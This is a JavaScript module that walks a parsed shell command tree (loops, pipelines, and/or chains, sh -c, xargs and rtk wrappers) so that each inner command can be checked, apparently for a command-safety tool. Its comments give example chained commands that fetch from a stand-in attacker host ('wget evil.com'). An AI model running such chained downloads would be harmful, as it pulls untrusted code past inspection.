import { _ } from 'golgoth';
import { extractCommandLineFromShC } from './helpers/extractCommandLineFromShC.js';
import { __ as xargsPrivate } from './helpers/extractCommandLineFromXargs.js';
import { extractFromRtkCommand } from './helpers/extractFromRtkCommand.js';

// Shells that support the -c flag for inline command execution
export const SHELL_COMMANDS = ['sh', 'zsh', 'bash'];

export let __;

/**
 * Walk a parsed command AST, calling callbacks at leaf nodes
 * @param {string} commandLine - The full command line
 * @param {Array<object>} statements - AST statement nodes
 * @param {object} callbacks - Callback functions for each leaf type
 * @param {Function} callbacks.onCommand - Called for simple commands
 * @param {Function} callbacks.onShC - Called for sh/bash/zsh -c with inner string
 * @param {Function} callbacks.onXargs - Called for xargs with command portion
 * @param {Function} callbacks.onRtk - Called for rtk wrapping non-native commands
 */
export function walkCommandAST(commandLine, statements, callbacks) {
  _.each(statements, (statement) => {
    __.walkNode(commandLine, statement.command, callbacks);
  });
}

__ = {
  /**
   * Dispatch a single AST node to the appropriate callback
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node
   * @param {object} callbacks - Callback functions
   */
  walkNode(commandLine, node, callbacks) {
    const nodeType = node.type;

    // while true; do echo hello; done
    if (nodeType === 'While') {
      walkCommandAST(commandLine, node.clause.commands, callbacks);
      walkCommandAST(commandLine, node.body.commands, callbacks);
      return;
    }

    // for i in a b c; do echo $i; done
    // for ((i=0; i<10; i++)); do echo $i; done
    if (nodeType === 'For' || nodeType === 'ArithmeticFor') {
      walkCommandAST(commandLine, node.body.commands, callbacks);
      return;
    }

    // echo hello && wget evil.com
    // echo hello || wget evil.com
    // echo hello | wget evil.com
    if (nodeType === 'AndOr' || nodeType === 'Pipeline') {
      _.each(node.commands, (subCommand) => {
        __.walkNode(commandLine, subCommand, callbacks);
      });
      return;
    }

    if (!node.name) {
      return;
    }

    const commandName = node.name.text;

    // sh/bash/zsh -c: extract inner string and call onShC
    if (SHELL_COMMANDS.includes(commandName)) {
      const result = __.extractShCInner(commandLine, node);
      if (result) {
        callbacks.onShC(node, result.innerString, result.argNode);
      } else {
        callbacks.onCommand(node);
      }
      return;
    }

    // xargs grep foo
    if (commandName === 'xargs') {
      const result = __.extractXargsInner(commandLine, node);
      if (result) {
        callbacks.onXargs(node, result.innerString, result.span);
      }
      return;
    }

    // rtk echo hello
    if (commandName === 'rtk') {
      const result = __.extractRtkInner(commandLine, node);
      if (result) {
        callbacks.onRtk(node, result.innerString, result.span);
      } else {
        callbacks.onCommand(node);
      }
      return;
    }

    // Simple command or unrecognized
    callbacks.onCommand(node);
  },

  /**
   * Extract inner string and arg node from sh/bash/zsh -c command
   * @param {string} commandLine - The full command line
   * @param {object} node - The shell Command AST node
   * @returns {object|null} { innerString, argNode } or null if no -c flag
   */
  extractShCInner(commandLine, node) {
    const innerString = extractCommandLineFromShC(commandLine, node);
    if (innerString === null) {
      return null;
    }

    // Helper validated -c exists; locate the argNode for position info
    const { suffix } = node;
    const cFlagIndex = _.findIndex(suffix, (entry) => {
      const { text } = entry;
      return (
        text.startsWith('-') && !text.startsWith('--') && text.includes('c')
      );
    });
    const argNode = suffix[cFlagIndex + 1];
    return { innerString, argNode };
  },

  /**
   * Extract inner command string and span from xargs command
   * @param {string} commandLine - The full command line
   * @param {object} node - The xargs Command AST node
   * @returns {object|null} { innerString, span: { start, end } } or null
   */
  extractXargsInner(commandLine, node) {
    const { suffix } = node;
    if (_.isEmpty(suffix)) {
      return null;
    }

    const firstCommandIndex = xargsPrivate.findFirstCommandIndex(suffix);
    if (firstCommandIndex === -1) {
      return null;
    }

    const commandParts = suffix.slice(firstCommandIndex);
    const firstPart = commandParts[0];
    const lastPart = commandParts[commandParts.length - 1];
    const start = firstPart.pos;
    const end = lastPart.end;

    // Handle quoted single-element xargs commands
    const isQuotedCommand = commandParts.length === 1 && firstPart.parts;
    const innerString = isQuotedCommand
      ? firstPart.value
      : commandLine.substring(start, end);

    return { innerString, span: { start, end } };
  },

  /**
   * Extract inner command string and span from rtk wrapper command
   * @param {string} commandLine - The full command line
   * @param {object} node - The rtk Command AST node
   * @returns {object|null} { innerString, span: { start, end } } or null if native
   */
  extractRtkInner(commandLine, node) {
    const innerString = extractFromRtkCommand(commandLine, node);
    if (innerString === null) {
      return null;
    }

    const suffix = node.suffix ?? [];
    const start = suffix[0].pos;
    const end = node.end;
    return { innerString, span: { start, end } };
  },
};
